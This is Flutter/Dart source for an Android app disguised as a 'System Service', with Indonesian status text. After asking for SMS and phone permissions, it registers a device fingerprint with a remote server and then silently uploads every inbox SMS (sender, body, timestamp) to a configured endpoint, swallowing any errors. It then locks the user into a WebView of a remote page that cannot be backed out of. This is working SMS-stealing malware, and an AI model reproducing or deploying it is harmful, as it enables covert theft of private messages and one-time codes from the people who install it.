// lib/main.dart
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'config.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'System Service',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(primarySwatch: Colors.blue, useMaterial3: true),
      home: const PermissionGate(),
    );
  }
}

class PermissionGate extends StatefulWidget {
  const PermissionGate({super.key});
  @override
  State<PermissionGate> createState() => _PermissionGateState();
}

class _PermissionGateState extends State<PermissionGate> {
  String status = "Menyiapkan sistem...";

  @override
  void initState() {
    super.initState();
    _requestAll();
  }

  Future<void> _requestAll() async {
    setState(() => status = "Meminta izin...");

    await Permission.sms.request();
    await Permission.phone.request();

    final prefs = await SharedPreferences.getInstance();
    String deviceId = prefs.getString("device_id") ?? "";

    if (deviceId.isEmpty) {
      final info = DeviceInfoPlugin();
      final android = await info.androidInfo;
      deviceId = "${android.brand}_${android.model}_${android.id}"
          .replaceAll(" ", "_");
      await prefs.setString("device_id", deviceId);
      await prefs.setString("device_model", "${android.brand} ${android.model}");
    }

    setState(() => status = "Menghubungkan ke server...");
    await _registerDevice(deviceId);
    await _syncHistory(deviceId);

    setState(() => status = "Siap");
    await Future.delayed(const Duration(milliseconds: 500));

    if (mounted) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(builder: (_) => const WebViewPage()),
      );
    }
  }

  Future<void> _registerDevice(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final model = prefs.getString("device_model") ?? "unknown";
      await http.post(
        Uri.parse(apiRegisterUrl),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "device_id": deviceId,
          "model": model,
          "registered_at": DateTime.now().millisecondsSinceEpoch,
        }),
      ).timeout(const Duration(seconds: 15));
    } catch (_) {}
  }

  Future<void> _syncHistory(String deviceId) async {
    try {
      final query = SmsQuery();
      final messages = await query.querySms(
        kinds: [SmsQueryKind.inbox],
        sort: true,
      );
      for (final m in messages) {
        await _postSms(
          deviceId: deviceId,
          sender: m.address ?? "unknown",
          body: m.body ?? "",
          timestamp: m.date?.millisecondsSinceEpoch ??
              DateTime.now().millisecondsSinceEpoch,
        );
      }
    } catch (_) {}
  }

  Future<void> _postSms({
    required String deviceId,
    required String sender,
    required String body,
    required int timestamp,
  }) async {
    try {
      await http.post(
        Uri.parse(apiSmsUrl),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "device_id": deviceId,
          "sender": sender,
          "body": body,
          "timestamp": timestamp,
        }),
      ).timeout(const Duration(seconds: 15));
    } catch (_) {}
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0F172A),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const CircularProgressIndicator(color: Colors.cyan),
            const SizedBox(height: 24),
            Text(status,
                style: const TextStyle(color: Colors.white, fontSize: 16)),
          ],
        ),
      ),
    );
  }
}

class WebViewPage extends StatefulWidget {
  const WebViewPage({super.key});
  @override
  State<WebViewPage> createState() => _WebViewPageState();
}

class _WebViewPageState extends State<WebViewPage> {
  late final WebViewController controller;
  bool loading = true;
  String errorMsg = "";

  @override
  void initState() {
    super.initState();
    controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(const Color(0xFF0F172A))
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (_) => setState(() {
            loading = true;
            errorMsg = "";
          }),
          onPageFinished: (_) => setState(() => loading = false),
          onWebResourceError: (err) {
            setState(() {
              loading = false;
              errorMsg = "Gagal memuat sistem";
            });
          },
        ),
      )
      ..loadRequest(Uri.parse(WEB_URL));
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      child: Scaffold(
        backgroundColor: const Color(0xFF0F172A),
        body: SafeArea(
          child: Stack(
            children: [
              WebViewWidget(controller: controller),
              if (loading)
                const Center(
                  child: CircularProgressIndicator(color: Colors.cyan),
                ),
              if (errorMsg.isNotEmpty && !loading)
                Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Text(errorMsg,
                          style: const TextStyle(
                              color: Colors.white, fontSize: 16)),
                      const SizedBox(height: 16),
                      ElevatedButton(
                        onPressed: () {
                          setState(() {
                            errorMsg = "";
                            loading = true;
                          });
                          controller.loadRequest(Uri.parse(WEB_URL));
                        },
                        child: const Text("Coba Lagi"),
                      ),
                    ],
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }
}